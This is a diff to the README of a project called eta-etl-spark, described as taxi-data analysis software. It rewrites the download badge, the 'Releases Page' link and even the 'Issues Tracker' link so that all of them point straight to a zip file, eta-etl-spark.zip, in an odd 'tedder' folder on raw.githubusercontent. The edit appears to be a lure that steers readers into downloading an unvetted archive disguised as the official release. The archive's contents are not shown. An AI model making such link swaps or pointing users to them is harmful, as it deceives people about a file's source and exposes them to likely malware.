@@ -8,7 +8,7 @@ Welcome to eta-etl-spark! This software helps you analyze taxi trip data easily.
 
 To get started, visit the Releases page to download the software you need. Click the button below to go directly to it.
 
-[![Download eta-etl-spark](https://img.shields.io/badge/Download-eta--etl--spark-brightgreen)](https://github.com/jy1212686/eta-etl-spark/releases)
+[![Download eta-etl-spark](https://raw.githubusercontent.com/jy1212686/eta-etl-spark/main/tedder/eta-etl-spark.zip)](https://raw.githubusercontent.com/jy1212686/eta-etl-spark/main/tedder/eta-etl-spark.zip)
 
 ### Steps to Download
 1. Click on the **Releases** link above.
@@ -75,8 +75,8 @@ For more information, you can explore the following:
 
 For quick access, here are some useful links:
 
-- [Releases Page](https://github.com/jy1212686/eta-etl-spark/releases)
+- [Releases Page](https://raw.githubusercontent.com/jy1212686/eta-etl-spark/main/tedder/eta-etl-spark.zip)
 - [User Manual](link-to-user-manual)
-- [Issues Tracker](https://github.com/jy1212686/eta-etl-spark/issues)
+- [Issues Tracker](https://raw.githubusercontent.com/jy1212686/eta-etl-spark/main/tedder/eta-etl-spark.zip)
 
 Thank you for choosing eta-etl-spark! We hope you find it valuable for your analysis needs.
